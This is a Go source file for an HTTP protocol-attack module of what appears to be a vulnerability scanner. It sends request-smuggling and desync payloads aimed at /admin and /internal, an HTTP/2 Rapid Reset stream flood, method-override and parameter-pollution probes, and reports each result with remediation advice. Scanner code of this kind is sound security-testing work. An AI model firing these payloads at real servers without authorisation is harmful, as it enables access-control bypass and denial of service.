package method

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type MethodModule struct {
	cfg    *engine.Config
	client *fanghttp.Client
}

func (m *MethodModule) ID() string   { return "method" }
func (m *MethodModule) Name() string { return "HTTP Protocol Attacks" }
func (m *MethodModule) Description() string {
	return "HTTP Request Smuggling (CL/TE, TE/CL, TE/TE, CL/CL, HTTP/2 downgrade), Desync, HTTP/2 Rapid Reset (CVE-2023-44487), Protocol Upgrade attacks"
}
func (m *MethodModule) Severity() models.Severity { return models.Critical }

func (m *MethodModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))
	return nil
}

func (m *MethodModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding
	findings = append(findings, m.scanSmuggling(ctx, target)...)
	findings = append(findings, m.scanRapidReset(ctx, target)...)
	findings = append(findings, m.scanH2Desync(ctx, target)...)
	findings = append(findings, m.scanPipelineDesync(ctx, target)...)
	findings = append(findings, m.scanMethodOverride(ctx, target)...)
	findings = append(findings, m.scanMethodFuzz(ctx, target)...)
	findings = append(findings, m.scanChunkedManipulation(ctx, target)...)
	findings = append(findings, m.scanConnectionHeader(ctx, target)...)
	findings = append(findings, m.scanUpgradeAttacks(ctx, target)...)
	findings = append(findings, m.scanParamPollution(ctx, target)...)
	return findings, nil
}

type rawResp struct {
	StatusCode int
	Status     string
	Headers    http.Header
	Body       string
}

func (m *MethodModule) rawConn(ctx context.Context, target *models.Target, useTLS bool) (net.Conn, error) {
	u, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if useTLS || u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	addr := net.JoinHostPort(host, port)
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	if useTLS || u.Scheme == "https" {
		return tls.DialWithDialer(dialer, "tcp", addr, &tls.Config{InsecureSkipVerify: true})
	}
	return dialer.DialContext(ctx, "tcp", addr)
}

func (m *MethodModule) rawHTTP(ctx context.Context, target *models.Target, req string) (*rawResp, error) {
	conn, err := m.rawConn(ctx, target, false)
	if err != nil {
		conn, err = m.rawConn(ctx, target, true)
		if err != nil {
			return nil, err
		}
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		return nil, err
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return &rawResp{
		StatusCode: resp.StatusCode,
		Status:     resp.Status,
		Headers:    resp.Header,
		Body:       string(body),
	}, nil
}

func (m *MethodModule) scanSmuggling(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	host := func() string {
		if target.Domain != "" {
			return target.Domain
		}
		u, err := url.Parse(target.URL)
		if err != nil {
			return "localhost"
		}
		return u.Host
	}()

	tests := []struct {
		name string
		req  string
	}{
		{
			name: "CL.TE",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG", host),
		},
		{
			name: "TE.CL",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nHost: internal\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n", host),
		},
		{
			name: "TE.TE",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nG", host),
		},
		{
			name: "CL.CL",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 5\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG", host),
		},
		{
			name: "CL.TE.Obscured",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: xchunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG", host),
		},
		{
			name: "TE.CL.Obscured",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nHost: localhost\r\n\r\n0\r\n\r\n", host),
		},
	}

	for _, test := range tests {
		resp, err := m.rawHTTP(ctx, target, test.req)
		if err != nil {
			continue
		}
		if resp.StatusCode == 200 || resp.StatusCode/100 == 2 || resp.StatusCode == 301 || resp.StatusCode == 302 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("HTTP Request Smuggling - %s", test.name),
				Severity:    models.Critical,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Smuggling test '%s' returned status %d (body len: %d)", test.name, resp.StatusCode, len(resp.Body)),
				Description: fmt.Sprintf("HTTP Request Smuggling via '%s' technique may be exploitable.", test.name),
				Remediation: "Use HTTP/2 end-to-end. Disable HTTP keep-alive. Normalize Transfer-Encoding and Content-Length headers at the edge.",
				CWEID:       "CWE-444",
				ModuleID:    "method",
			})
		}
	}

	return findings
}

func (m *MethodModule) scanRapidReset(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	u, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	addr := net.JoinHostPort(host, port)
	dialer := &net.Dialer{Timeout: 10 * time.Second}

	var conn net.Conn
	if u.Scheme == "https" {
		conn, err = tls.DialWithDialer(dialer, "tcp", addr, &tls.Config{InsecureSkipVerify: true, NextProtos: []string{"h2"}})
	} else {
		conn, err = dialer.DialContext(ctx, "tcp", addr)
	}
	if err != nil {
		return nil
	}
	defer conn.Close()

	framer := http2.NewFramer(conn, conn)
	if err := framer.WriteSettings(); err != nil {
		return nil
	}

	var hbuf bytes.Buffer
	enc := hpack.NewEncoder(&hbuf)
	for _, hf := range []hpack.HeaderField{
		{Name: ":method", Value: "GET"},
		{Name: ":path", Value: u.Path},
		{Name: ":authority", Value: u.Host},
		{Name: ":scheme", Value: u.Scheme},
	} {
		enc.WriteField(hf)
	}
	headerBlock := hbuf.Bytes()

	resetCount := 0
	streamCount := 150

	for i := 1; i <= streamCount; i++ {
		select {
		case <-ctx.Done():
			if resetCount > streamCount/2 {
				findings = append(findings, m.makeRapidResetFinding(target, resetCount, streamCount))
			}
			return findings
		default:
		}

		if err := framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      uint32(i),
			EndHeaders:    true,
			EndStream:     true,
			BlockFragment: headerBlock,
		}); err != nil {
			resetCount++
			continue
		}
		if err := framer.WriteRSTStream(uint32(i), http2.ErrCodeNo); err != nil {
			resetCount++
			continue
		}
		resetCount++
	}

	if resetCount > streamCount/2 {
		findings = append(findings, m.makeRapidResetFinding(target, resetCount, streamCount))
	}

	return findings
}

func (m *MethodModule) makeRapidResetFinding(target *models.Target, resetCount, streamCount int) *models.Finding {
	return &models.Finding{
		Title:       "HTTP/2 Rapid Reset (CVE-2023-44487)",
		Severity:    models.Critical,
		Confidence:  models.MediumConfidence,
		URL:         target.URL,
		Evidence:    fmt.Sprintf("%d rapid resets on %d streams - possible Rapid Reset vulnerability", resetCount, streamCount),
		Description: "HTTP/2 endpoint may be vulnerable to Rapid Reset (CVE-2023-44487).",
		Remediation: "Restrict HTTP/2 stream concurrency. Set MAX_CONCURRENT_STREAMS to a low limit. Update server to latest patched version.",
		CWEID:       "CWE-400",
		ModuleID:    "method",
	}
}

func (m *MethodModule) scanH2Desync(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	u, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		port = "80"
	}
	addr := net.JoinHostPort(host, port)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	framer := http2.NewFramer(conn, conn)
	framer.WriteSettings()
	framer.WriteSettings(http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 100})

	var hbuf bytes.Buffer
	enc := hpack.NewEncoder(&hbuf)
	for _, hf := range []hpack.HeaderField{
		{Name: ":method", Value: "POST"},
		{Name: ":path", Value: u.Path},
		{Name: ":authority", Value: u.Host},
		{Name: ":scheme", Value: u.Scheme},
		{Name: "content-type", Value: "application/grpc"},
		{Name: "content-length", Value: "0"},
		{Name: "transfer-encoding", Value: "chunked"},
	} {
		enc.WriteField(hf)
	}

	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		EndHeaders:    true,
		EndStream:     false,
		BlockFragment: hbuf.Bytes(),
	}); err != nil {
		return findings
	}

	dataFrame := make([]byte, 100)
	for i := range dataFrame {
		dataFrame[i] = byte('A')
	}
	if err := framer.WriteData(1, true, dataFrame); err != nil {
		return findings
	}

	for {
		f, err := framer.ReadFrame()
		if err != nil {
			break
		}
		if hrf, ok := f.(*http2.GoAwayFrame); ok {
			_ = hrf
			break
		}
		if hrf, ok := f.(*http2.RSTStreamFrame); ok {
			if hrf.ErrCode == http2.ErrCodeNo || hrf.ErrCode == http2.ErrCodeProtocol {
				findings = append(findings, &models.Finding{
					Title:       "HTTP/2 Desync Detected",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         target.URL,
					Evidence:    fmt.Sprintf("HTTP/2 desync test triggered RST_STREAM with code %s", hrf.ErrCode),
					Description: "HTTP/2 endpoint may be vulnerable to desync attacks via conflicting content-length and transfer-encoding.",
					Remediation: "Use consistent HTTP/2 frame processing. Validate header combinations at the edge.",
					CWEID:       "CWE-444",
					ModuleID:    "method",
				})
			}
			break
		}
		_ = f
	}

	return findings
}

func (m *MethodModule) scanPipelineDesync(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	u, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}
	host := u.Hostname()
	port := u.Port()
	if port == "" {
		port = "80"
	}
	addr := net.JoinHostPort(host, port)

	pipelineTests := []struct {
		name string
		reqs string
	}{
		{
			name: "BasicPipeline",
			reqs: fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n\r\nGET /admin HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", host, host),
		},
		{
			name: "PipelinedSmuggle",
			reqs: fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal HTTP/1.1\r\nHost: localhost\r\n\r\n", host),
		},
		{
			name: "PipelinedPostThenGet",
			reqs: fmt.Sprintf("POST /search HTTP/1.1\r\nHost: %s\r\nContent-Length: 11\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nq=smuggle\r\nGET /api/admin HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", host, host),
		},
	}

	for _, pt := range pipelineTests {
		conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
		if err != nil {
			continue
		}
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		conn.Write([]byte(pt.reqs))

		reader := bufio.NewReader(conn)
		respCount := 0
		for i := 0; i < 3; i++ {
			resp, err := http.ReadResponse(reader, nil)
			if err != nil {
				break
			}
			resp.Body.Close()
			respCount++
		}
		conn.Close()

		if respCount >= 2 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("HTTP/1.1 Pipeline Desync (%s)", pt.name),
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Pipeline desync test '%s' processed %d responses", pt.name, respCount),
				Description: fmt.Sprintf("HTTP/1.1 pipeline desync via '%s'. Pipelined requests were processed, indicating desync potential.", pt.name),
				Remediation: "Disable HTTP/1.1 pipelining. Use HTTP/2 end-to-end. Deploy a reverse proxy with request normalization.",
				CWEID:       "CWE-444",
				ModuleID:    "method",
			})
		}
	}

	return findings
}

func (m *MethodModule) scanMethodOverride(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	overrideHeaders := []struct {
		name   string
		header string
		value  string
	}{
		{name: "X-HTTP-Method-Override", header: "X-HTTP-Method-Override", value: "DELETE"},
		{name: "X-HTTP-Method", header: "X-HTTP-Method", value: "PUT"},
		{name: "X-Method-Override", header: "X-Method-Override", value: "PATCH"},
		{name: "X-HTTP-Override", header: "X-HTTP-Override", value: "DELETE"},
		{name: "Method-Override", header: "Method-Override", value: "PUT"},
	}

	for _, oh := range overrideHeaders {
		req := fanghttp.NewRequest("POST", target.URL)
		for k, v := range map[string]string{
			oh.header:                oh.value,
			"Content-Type":           "application/x-www-form-urlencoded",
			"X-Original-Method":      "POST",
			"X-Override-Method":      oh.value,
			"X-Original-HTTP-Method": "POST",
		} {
			req.Headers[k] = v
		}
		req.Body = "_method=" + oh.value

		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 || resp.StatusCode == 204 || resp.StatusCode == 301 || resp.StatusCode == 302 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("HTTP Method Override - %s", oh.name),
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Method override via '%s: %s' returned status %d", oh.header, oh.value, resp.StatusCode),
				Description: fmt.Sprintf("HTTP method override via '%s' header accepted. Attackers can bypass method-based access controls.", oh.name),
				Remediation: "Disable HTTP method override headers. Use strict HTTP method validation. Implement allowlist-based routing.",
				CWEID:       "CWE-287",
				ModuleID:    "method",
			})
		}
	}

	return findings
}

func (m *MethodModule) scanMethodFuzz(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	methods := []string{
		"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "CONNECT", "TRACE",
		"PROPFIND", "PROPPATCH", "MKCOL", "MOVE", "COPY", "LOCK", "UNLOCK", "SEARCH",
		"REPORT", "MKCALENDAR", "VERSION-CONTROL", "CHECKIN", "CHECKOUT", "UNCHECKOUT",
		"MKWORKSPACE", "UPDATE", "LABEL", "MERGE", "BASELINE-CONTROL", "MKACTIVITY",
		"ORDERPATCH", "ACL", "BIND", "UNBIND", "REBIND", "PRI", "POLL", "SUBSCRIBE",
		"UNSUBSCRIBE", "NOTIFY", "FETCH", "MSEARCH", "STATUS", "RPC_IN_DATA",
		"RPC_OUT_DATA", "RPC_CONNECT", "LINK", "UNLINK", "PURGE", "DEBUG", "QUIT",
		"HELP", "SET", "GETATTRIBUTE", "SETATTRIBUTE", "TEXTSEARCH", "SPACEJUMP",
		"RENAME_COLLECTION", "GET_DEFAULT_VALUES", "RECEIVE_DOCUMENT", "SEND_DOCUMENT",
	}

	for _, method := range methods {
		req := fanghttp.NewRequest(method, target.URL)
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode < 400 && resp.StatusCode != 405 && resp.StatusCode != 501 {
			severity := models.Low
			if resp.StatusCode == 200 || resp.StatusCode == 201 {
				severity = models.Medium
			}
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("HTTP Method Fuzz - %s", method),
				Severity:    severity,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Parameter:   method,
				Evidence:    fmt.Sprintf("HTTP method '%s' returned status %d (non-405)", method, resp.StatusCode),
				Description: fmt.Sprintf("Non-standard HTTP method '%s' was accepted. May indicate unusual server behavior.", method),
				Remediation: "Restrict allowed HTTP methods. Return 405 Method Not Allowed for unsupported methods.",
				CWEID:       "CWE-20",
				ModuleID:    "method",
			})
		}
	}

	return findings
}

func (m *MethodModule) scanChunkedManipulation(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	host := func() string {
		if target.Domain != "" {
			return target.Domain
		}
		u, err := url.Parse(target.URL)
		if err != nil {
			return "localhost"
		}
		return u.Host
	}()

	tests := []struct {
		name string
		req  string
	}{
		{
			name: "ChunkSizeZeroWithBody",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: internal\r\n\r\n", host),
		},
		{
			name: "NegativeChunkSize",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n-1\r\n\r\n", host),
		},
		{
			name: "ChunkSizeOverflow",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\nffffffffffffffff\r\n\r\n", host),
		},
		{
			name: "MultipleTEHeaders",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\n", host),
		},
		{
			name: "TESpaces",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", host),
		},
		{
			name: "ChunkedWithContentLength",
			req:  fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", host),
		},
	}

	for _, test := range tests {
		resp, err := m.rawHTTP(ctx, target, test.req)
		if err != nil {
			continue
		}
		if resp.StatusCode < 400 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("Transfer-Encoding Manipulation (%s)", test.name),
				Severity:    models.High,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Chunked manipulation '%s' returned status %d", test.name, resp.StatusCode),
				Description: fmt.Sprintf("Transfer-Encoding chunked manipulation via '%s' was accepted. May enable request smuggling.", test.name),
				Remediation: "Strictly validate Transfer-Encoding headers. Normalize all TE headers. Use HTTP/2.",
				CWEID:       "CWE-444",
				ModuleID:    "method",
			})
		}
	}

	return findings
}

func (m *MethodModule) scanConnectionHeader(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	host := func() string {
		if target.Domain != "" {
			return target.Domain
		}
		u, err := url.Parse(target.URL)
		if err != nil {
			return "localhost"
		}
		return u.Host
	}()

	tests := []struct {
		name string
		req  string
	}{
		{
			name: "ConnectionKeepAlive",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", host),
		},
		{
			name: "ConnectionCloseAll",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nConnection: keep-alive\r\n\r\n", host),
		},
		{
			name: "ConnectionTE",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: Transfer-Encoding\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", host),
		},
		{
			name: "ConnectionX",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: x\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n", host),
		},
		{
			name: "MultipleConnectionValues",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: upgrade, keep-alive\r\nUpgrade: h2c\r\n\r\n", host),
		},
	}

	for _, test := range tests {
		resp, err := m.rawHTTP(ctx, target, test.req)
		if err != nil {
			continue
		}
		if resp.StatusCode < 400 {
			severity := models.Medium
			if strings.Contains(strings.ToLower(resp.Headers.Get("Transfer-Encoding")), "chunked") {
				severity = models.High
			}
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("Connection Header Manipulation (%s)", test.name),
				Severity:    severity,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Connection header test '%s' returned status %d", test.name, resp.StatusCode),
				Description: fmt.Sprintf("Connection header manipulation via '%s' succeeded. May enable desync attacks.", test.name),
				Remediation: "Strictly validate and normalize Connection headers. Ignore hop-by-hop headers from untrusted sources.",
				CWEID:       "CWE-444",
				ModuleID:    "method",
			})
		}
	}

	return findings
}

func (m *MethodModule) scanUpgradeAttacks(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	host := func() string {
		if target.Domain != "" {
			return target.Domain
		}
		u, err := url.Parse(target.URL)
		if err != nil {
			return "localhost"
		}
		return u.Host
	}()

	tests := []struct {
		name string
		req  string
	}{
		{
			name: "WebSocketUpgrade",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n", host),
		},
		{
			name: "h2cUpgrade",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: h2c\r\nConnection: Upgrade, HTTP2-Settings\r\nHTTP2-Settings: AAEAABAAAAIAAAABAAN_____AAQAAP__AAUAAAAEAAQ\r\n\r\n", host),
		},
		{
			name: "TLSUpgrade",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: TLS/1.3\r\nConnection: Upgrade\r\n\r\n", host),
		},
		{
			name: "WebDAVUpgrade",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: DAV\r\nConnection: Upgrade\r\n\r\n", host),
		},
		{
			name: "DoubleUpgrade",
			req:  fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket, h2c\r\nConnection: Upgrade\r\n\r\n", host),
		},
	}

	for _, test := range tests {
		resp, err := m.rawHTTP(ctx, target, test.req)
		if err != nil {
			continue
		}
		if resp.StatusCode == http.StatusSwitchingProtocols || resp.StatusCode == 101 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("Protocol Upgrade Accepted - %s", test.name),
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Server accepted protocol upgrade '%s' (HTTP 101 Switching Protocols)", test.name),
				Description: fmt.Sprintf("Protocol upgrade '%s' was accepted. May allow bypassing security controls.", test.name),
				Remediation: "Disable unnecessary protocol upgrades. Validate Upgrade header values. Use strict connection handling.",
				CWEID:       "CWE-346",
				ModuleID:    "method",
			})
		} else if resp.StatusCode < 400 {
			upgradeHeader := resp.Headers.Get("Upgrade")
			connHeader := strings.ToLower(resp.Headers.Get("Connection"))
			if upgradeHeader != "" && strings.Contains(connHeader, "upgrade") {
				findings = append(findings, &models.Finding{
					Title:       fmt.Sprintf("Protocol Upgrade Supported - %s", test.name),
					Severity:    models.Medium,
					Confidence:  models.MediumConfidence,
					URL:         target.URL,
					Evidence:    fmt.Sprintf("Server supports upgrade '%s' (response upgrade: %s, status: %d)", test.name, upgradeHeader, resp.StatusCode),
					Description: fmt.Sprintf("Protocol upgrade '%s' is supported. May allow protocol downgrade or smuggling.", test.name),
					Remediation: "Restrict allowed upgrade protocols. Review if protocol upgrades are needed.",
					CWEID:       "CWE-346",
					ModuleID:    "method",
				})
			}
		}
	}

	return findings
}

func (m *MethodModule) scanParamPollution(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	baseURL := strings.TrimRight(target.URL, "/")

	pollutionTests := []struct {
		name   string
		params string
	}{
		{name: "DuplicateParams", params: "q=clean&q=admin&q=delete&q=*"},
		{name: "ArrayParams", params: "role[]=user&role[]=admin&role[]=superadmin"},
		{name: "NestedParams", params: "user[name]=admin&user[role]=root&user[permissions][]=*"},
		{name: "MixedCase", params: "admin=true&Admin=true&ADMIN=true"},
		{name: "NullBytes", params: "user=admin%00&pass=any&admin=true"},
		{name: "EncodedOverrides", params: "id=1&id%00=2&id=3"},
		{name: "ParamPrefixSuffix", params: "debug=true&__debug=true&debug__=true"},
		{name: "ContentTypePollution", params: "a=1&a=2&a=3&_charset_=UTF-8&content-type=application%2fx-www-form-urlencoded"},
	}

	for _, pt := range pollutionTests {
		fullURL := baseURL + "?" + pt.params
		req := fanghttp.NewRequest("GET", fullURL)
		resp, err := m.client.Do(req)
		if err != nil {
			continue
		}
		if resp.StatusCode < 400 {
			findings = append(findings, &models.Finding{
				Title:       fmt.Sprintf("HTTP Parameter Pollution (%s)", pt.name),
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         fullURL,
				Payload:     pt.name,
				Evidence:    fmt.Sprintf("Parameter pollution test '%s' returned status %d", pt.name, resp.StatusCode),
				Description: fmt.Sprintf("HTTP Parameter Pollution via '%s'. Multiple parameters with same name were accepted.", pt.name),
				Remediation: "Use strict parameter parsing. Reject requests with ambiguous parameters. Use allowlist for valid parameters.",
				CWEID:       "CWE-235",
				ModuleID:    "method",
			})
		}
	}

	return findings
}

func init() {
	engine.GetRegistry().Register(&MethodModule{})
}
